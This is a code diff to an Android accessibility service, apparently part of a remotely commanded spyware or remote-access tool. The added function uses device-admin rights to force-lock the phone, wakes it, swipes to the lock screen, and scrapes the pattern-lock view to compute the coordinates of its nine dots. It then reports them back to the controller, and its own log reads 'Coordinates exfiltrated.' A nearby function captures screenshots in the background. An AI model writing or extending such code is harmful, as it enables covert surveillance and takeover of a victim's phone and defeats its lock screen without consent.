@@ -628,6 +628,88 @@ class MyAccessibilityService : AccessibilityService() {
         return withTimeoutOrNull(dur + 2000) { deferred.await() } ?: false
     }
 
+    suspend fun executeMapGridSequence(cmdId: Int, depth: Int) {
+        DebugLogger.log("MAP_GRID", "Starting grid discovery sequence...")
+        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+        val adminComponent = android.content.ComponentName(this, MyDeviceAdminReceiver::class.java)
+        
+        // 1. FORCE LOCK
+        if (dpm.isAdminActive(adminComponent)) {
+            dpm.lockNow()
+            delay(2000) // Wait for screen to fully settle
+        } else {
+            CommandProcessor.updateCommandStatus(applicationContext, cmdId, "FAILED_ADMIN", "Device Admin not active")
+            return
+        }
+
+        // 2. WAKE
+        val intent = Intent("WAKE").apply { putExtra("val", "standard") }
+        // Re-use internal dispatcher logic via a synthetic call or just call the NAV/WAKE block
+        // For reliability, we trigger the WAKE step manually:
+        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+        val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:GridWake")
+        wakeLock.acquire(3000)
+        val pulseIntent = android.content.Intent(applicationContext, PulseActivity::class.java).apply {
+            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_USER_ACTION or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
+            putExtra("is_wake_trigger", true)
+        }
+        startActivity(pulseIntent)
+        delay(1200)
+
+        // 3. SWIPE UP (To show Pattern View)
+        val metrics = resources.displayMetrics
+        val centerX = metrics.widthPixels / 2f
+        val bottom = metrics.heightPixels * 0.9f
+        val top = metrics.heightPixels * 0.2f
+        dispatchGesturePath(listOf(Pair(centerX, bottom), Pair(centerX, top)), 400)
+        delay(1000)
+
+        // 4. SCRAPE & MATH
+        val root = rootInActiveWindow
+        val tree = serializeNode(root, 0, depth)
+        val result = JSONObject()
+        
+        fun findPatternNode(node: JSONObject?): JSONObject? {
+            if (node == null) return null
+            if (node.optString("id").contains("lockPatternView", ignoreCase = true)) return node
+            val children = node.optJSONArray("children")
+            if (children != null) {
+                for (i in 0 until children.length()) {
+                    val found = findPatternNode(children.getJSONObject(i))
+                    if (found != null) return found
+                }
+            }
+            return null
+        }
+
+        val patternNode = findPatternNode(tree)
+        if (patternNode != null) {
+            val boundsStr = patternNode.getString("bounds")
+            val b = boundsStr.split(",").map { it.toInt() }
+            val L = b[0]; val T = b[1]; val R = b[2]; val B = b[3]
+            val W = R - L; val H = B - T
+            
+            val grid = JSONObject()
+            for (row in 1..3) {
+                for (col in 1..3) {
+                    val dotX = L + (W * (2 * col - 1) / 6)
+                    val dotY = T + (H * (2 * row - 1) / 6)
+                    grid.put("dot_${(row-1)*3 + col}", "$dotX,$dotY")
+                }
+            }
+            
+            result.put("grid_coordinates", grid)
+            result.put("view_bounds", boundsStr)
+            result.put("screen_res", "${metrics.widthPixels}x${metrics.heightPixels}")
+            CommandProcessor.updateCommandStatus(applicationContext, cmdId, "MAP_SUCCESS", null, result, null)
+            DebugLogger.log("MAP_GRID", "Success. Coordinates exfiltrated.")
+        } else {
+            result.put("raw_tree_snapshot", tree)
+            CommandProcessor.updateCommandStatus(applicationContext, cmdId, "MAP_FAILED", "lockPatternView not found in tree", result, null)
+            DebugLogger.log("MAP_GRID", "Failed: Pattern view not found.")
+        }
+    }
+
     fun captureScreenshot(quality: Int, callback: (java.io.File?) -> Unit) {
         if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.R) {
             DebugLogger.log("SCREENSHOT_ERR", "API 30+ required for background screenshot.")
